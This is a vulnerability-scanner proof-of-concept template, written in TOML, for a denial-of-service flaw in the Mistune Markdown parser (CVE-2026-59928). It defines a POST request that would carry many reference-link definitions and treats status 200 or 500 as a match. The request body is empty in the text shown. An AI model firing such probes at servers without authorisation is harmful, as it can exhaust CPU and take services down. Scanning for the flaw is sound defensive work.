[info]
author = "ave"
description = "向使用 Mistune < 3.3.0 解析 Markdown 的服务端提交包含大量引用链接定义的文档，验证解析器是否存在二次时间复杂度导致的 CPU 耗尽拒绝服务"
id = "POC-AVE-2026-0869"
name = "CVE-2026-59928 Mistune 引用链接解析 DoS PoC"
severity = "high"
tags = ["ave-2026-0869"]
vuln_id = [
    "CVE-2026-59928",
    "AVE-2026-0869",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.body]
type = "raw"

[poc.requests.headers]
Content-Type = "text/markdown"
User-Agent = "AVE-PoC/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    500,
]
type = "status"
